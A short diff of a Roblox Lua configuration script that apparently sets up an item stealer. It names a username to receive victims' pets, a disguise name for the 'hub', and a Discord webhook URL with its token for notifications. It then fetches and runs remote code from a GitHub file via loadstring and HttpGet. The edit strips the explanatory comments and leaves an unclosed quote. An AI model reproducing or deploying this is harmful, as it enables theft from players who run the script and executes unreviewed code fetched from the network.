@@ -1,5 +1,5 @@
-_G.Username "IAmNobodyFRar" --This is where you put where you want the pets to go
-_G.HubName "Galxied" --Put any name here of any script
-_G.WebhookUrl "https://discord.com/api/webhooks/1151122534595567676/0Cq1FU8qckQ29KywHvJAbeHjXAMrghGCViMaKlApVBiWoenPacfGlTR4RXyz9-fp_rqG" --This is where the notifications get sent
+_G.Username "IAmNobodyFRar" 
+_G.HubName "Galxied
+_G.WebhookUrl "https://discord.com/api/webhooks/1151122534595567676/0Cq1FU8qckQ29KywHvJAbeHjXAMrghGCViMaKlApVBiWoenPacfGlTR4RXyz9-fp_rqG" 
 
 loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
